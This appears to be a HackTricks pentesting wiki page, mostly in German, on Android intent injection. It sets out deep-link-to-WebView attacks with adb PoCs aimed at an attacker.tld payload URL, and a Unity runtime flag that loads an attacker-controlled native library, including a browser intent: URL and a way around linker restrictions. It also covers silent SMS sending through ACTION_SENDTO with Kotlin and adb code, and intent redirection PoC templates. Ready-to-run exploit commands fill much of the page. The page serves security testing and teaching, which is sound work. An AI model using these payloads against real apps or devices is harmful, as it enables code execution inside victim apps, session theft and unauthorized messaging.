# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection missbraucht Komponenten, die vom Angreifer kontrollierte Intents oder Daten akzeptieren, die später in Intents umgewandelt werden. Zwei sehr häufige Muster bei Android app pentests sind:

- Übergeben von crafted extras an exported Activities/Services/BroadcastReceivers, die später an privilegierte, non-exported Komponenten weitergeleitet werden.
- Auslösen von exported VIEW/BROWSABLE deep links, die vom Angreifer kontrollierte URLs in interne WebViews oder andere sensitive sinks weiterleiten.

## Deep links → WebView sink (URL parameter injection)

Wenn eine App einen custom scheme deep link wie folgt bereitstellt:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
und die empfangende Activity den Query-Parameter `url` in ein WebView weiterleitet, können Sie die App zwingen, beliebige entfernte Inhalte in ihrem eigenen WebView-Kontext darzustellen.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact
- HTML/JS executes inside the app’s WebView profile.
- If JavaScript is enabled (by default or due to misordered checks), you can enumerate/use any exposed `@JavascriptInterface` objects, steal WebView cookies/local storage, and pivot.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Reihenfolge-Fehler, der JavaScript aktiviert

Ein wiederkehrender Fehler ist das Aktivieren von JavaScript (oder anderen zu permissiven WebView-Einstellungen), bevor die finale URL-allowlist/Verifizierung abgeschlossen ist. Wenn frühe Helfer deinen deep link akzeptieren und das WebView zuerst konfiguriert wird, erfolgt der finale Ladevorgang mit bereits aktiviertem JavaScript, selbst wenn spätere Prüfungen fehlerhaft oder zu spät sind.

Worauf man in dekompiliertem Code achten sollte:
- Mehrere Helfer, die die URL unterschiedlich parsen/aufteilen/wiederaufbauen (inkonsistente Normalisierung).
- Calls to `getSettings().setJavaScriptEnabled(true)` before the last host/path allowlist check.
- Eine Pipeline wie: parse → partial validate → configure WebView → final verify → loadUrl.


## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Unity-based Android apps typically use `com.unity3d.player.UnityPlayerActivity` (or `UnityPlayerGameActivity`) as the entry Activity. Unity’s Android template treats a special Intent extra named `unity` as a string of command-line flags for the Unity runtime. When the entry Activity is exported (default in many templates), any local app – and sometimes a website if `BROWSABLE` is present – can supply this extra.

A dangerous, undocumented flag leads to native code execution during very early process initialization:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` very early in init, loading attacker-controlled ELF inside the target app’s process with its UID and permissions.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Warum es funktioniert
- Das Intent-extra `unity` wird in Unity runtime flags geparst.
- Das Setzen des pre-init-Flags zeigt Unity auf einen vom Angreifer kontrollierten ELF-Pfad innerhalb eines erlaubten Linker-Namespace-Pfads (siehe Einschränkungen unten).

Conditions for exploitation
- Die Unity entry Activity ist exported (häufig standardmäßig der Fall).
- Für One-Click-Remote über den Browser: die entry Activity deklariert außerdem `android.intent.category.BROWSABLE`, sodass Extras von einer `intent:`-URL übergeben werden können.

Local exploitation (same device)
1) Place a payload ELF at a path readable by the victim app. Easiest: ship a malicious library in your own attacker app and ensure it is extracted under `/data/app/.../lib/<abi>/` by setting in the attacker’s manifest:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Starten Sie die Unity-Aktivität des Opfers mit dem CLI pre-init flag im `unity` extra. Beispiel ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; dein payload läuft im Opferprozess und erbt alle App-Berechtigungen (camera/mic/network/storage, etc.) sowie Zugriff auf in-app sessions/data.

Notes
- Der genaue Pfad `/data/app/...` variiert je nach Gerät/Installation. Eine Angreifer-App kann ihr eigenes native lib dir zur Laufzeit via `getApplicationInfo().nativeLibraryDir` ermitteln und an den Trigger übermitteln.
- Die Datei muss nicht mit `.so` enden, solange sie ein gültiges ELF ist – `dlopen()` achtet auf ELF-Header, nicht auf Dateiendungen.

Remote one‑click via browser (conditional)
If the Unity entry activity is exported with `BROWSABLE`, a website can pass extras via an `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Allerdings blockieren auf modernen Android-Versionen die dynamic linker namespaces und SELinux das Laden aus vielen öffentlichen Pfaden (z. B. `/sdcard/Download`). Sie sehen Fehler wie:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Umgehungsstrategie: Ziele Apps, die vom Angreifer kontrollierte Bytes im privaten Speicher cachen (z. B. HTTP-Caches). Da erlaubte Pfade `/data` und das private Verzeichnis der App einschließen, kann das Setzen von `-xrsdk-pre-init-library` auf einen absoluten Pfad innerhalb des App-Caches die Linker-Beschränkungen erfüllen und Codeausführung ermöglichen. Dies spiegelt frühere cache-to-ELF RCE-Muster wider, die in anderen Android-Apps beobachtet wurden.


## Confused‑Deputy: Stille SMS/MMS über ACTION_SENDTO (Wear OS Google Messages)

Einige Standard-Messaging-Apps führen implizite Messaging-Intents fälschlicherweise automatisch aus und verwandeln sie in ein Confused‑Deputy-Primitive: Jede nicht-privilegierte App kann `Intent.ACTION_SENDTO` mit `sms:`, `smsto:`, `mms:`, oder `mmsto:` auslösen und ein sofortiges Senden ohne Bestätigungs-UI und ohne die `SEND_SMS`-Berechtigung verursachen.

Wichtige Punkte
- Auslöser: implizites `ACTION_SENDTO` + Messaging-URI-Schema.
- Daten: Empfänger in der URI setzen, Nachrichtentext im Extra `"sms_body"`.
- Berechtigungen: keine (kein `SEND_SMS`), abhängig vom Standard-SMS/MMS-Handler.
- Beobachtet: Google Messages für Wear OS (behoben Mai 2025). Andere Handler sollten ähnlich geprüft werden.

Minimaler payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (keine besonderen Berechtigungen)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
Attack surface expansion (Wear OS)
- Any component capable of launching activities can fire the same payload: Activities, foreground Services (with `FLAG_ACTIVITY_NEW_TASK`), Tiles, Complications.
- If the default handler auto‑sends, abuse can be one‑tap or fully silent from background contexts depending on OEM policies.

Pentest checklist
- Resolve `ACTION_SENDTO` on target to identify the default handler; verify whether it shows a compose UI or silently sends.
- Exercise all four schemes (`sms:`, `smsto:`, `mms:`, `mmsto:`) and extras (`sms_body`, optionally `subject` for MMS) to check behaviour differences.
- Consider charged destinations/premium‑rate numbers when testing on real devices.


## Other classic Intent injection primitives

- startActivity/sendBroadcast using attacker-supplied `Intent` extras that are later re-parsed (`Intent.parseUri(...)`) and executed.
- Exported proxy components that forward Intents to non-exported sensitive components without permission checks.

---

## Automating exported-component testing (Smali-driven ADB generation)

When exported components expect specific extras, guessing payload shape causes time waste and false negatives. You can automate discovery of keys/types directly from Smali and emit ready-to-run adb commands.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: decompile and scan Smali for calls like `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` to infer which extras and fields are consumed by each component.
- Output: for every exported Activity/Service/Receiver/Provider, the tool prints a short explanation and the exact `adb shell am ...`/`cmd content ...` command with correctly typed flags.

Install
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Verwendung
```bash
python apk-components-inspector.py target.apk
```
Beispielausgabe
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am Extras-Spickzettel (typenbewusste Flags)
- Strings: `--es key value` | String-Array: `--esa key v1,v2`
- Ganze Zahlen: `--ei key 123` | Int-Array: `--eia key 1,2,3`
- Boolesche Werte: `--ez key true|false`
- Long-Werte: `--el key 1234567890`
- Gleitkommazahlen: `--ef key 1.23`
- URIs (Extra): `--eu key content://...` | Data-URI (Intent-Daten): `-d content://...`
- Component-Extra: `--ecn key com.pkg/.Cls`
- Null-String-Extra: `--esn key`
- Gängige Flags: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro-Tipps für Providers
- Verwende `adb shell cmd content query|insert|update|delete ...`, um ContentProviders ohne Agenten anzusprechen.
- Für SQLi-Probing variiere `--projection` und `--where` (aka selection), wenn der zugrundeliegende Provider SQLite-basiert ist.

Vollständige Pipeline-Automatisierung (interaktiver Executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>Hilfsskript zum Parsen und Ausführen von adb-Befehlen</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

Auf dem Gerät ausführen: der inspector ist Python-basiert und funktioniert in Termux oder auf gerooteten Handys, auf denen `apktool`/`androguard` verfügbar sind.

---

## Intent Redirection (CWE-926) – Erkennung und Ausnutzung

Pattern
- Ein exportierter Einstiegspunkt (Activity/Service/Receiver) liest ein eingehendes Intent und leitet es intern oder extern weiter, ohne Quelle/Daten zu validieren, z. B.:
- `startActivity(getIntent())`
- `startActivity(intent)` wobei `intent` aus einem Extra wie `redirect_intent`/`next_intent`/`pending_intent` oder `Intent.parseUri(...)` stammt.
- Vertrauen auf `action`/`data`/`component`-Felder ohne Prüfungen; keine Überprüfung der Identität des Aufrufers.

Wonach in Smali/Java suchen
- Verwendung von `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Direktes `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` auf von einem Angreifer beeinflusste Intents.
- Fehlen von `getCallingPackage()`/`getCallingActivity()`-Prüfungen oder benutzerdefinierten Berechtigungsprüfungen.

ADB PoC templates
- Proxy Activity, die ein extra Intent an eine privilegierte interne Activity weiterleitet:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Exportierter Service, der ein `redirect_intent` parcelable berücksichtigt:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exportierter Receiver, der ohne Validierung weiterleitet:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Flags hilfreich für singleTask-ähnliches Verhalten
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Reale Beispiele (Auswirkungen variieren):
- CVE-2024-26131 (Element Android): exportierte Abläufe führten zu WebView-Manipulation, PIN-Bypass und Login-Hijack.
- CVE-2023-44121 (LG ThinQ Service): exportierter Receiver-Action `com.lge.lms.things.notification.ACTION` → Auswirkungen auf Systemebene.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): Umleitung → beliebiger Dateizugriff (mit Benutzerinteraktion).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implizite Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## Referenzen

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
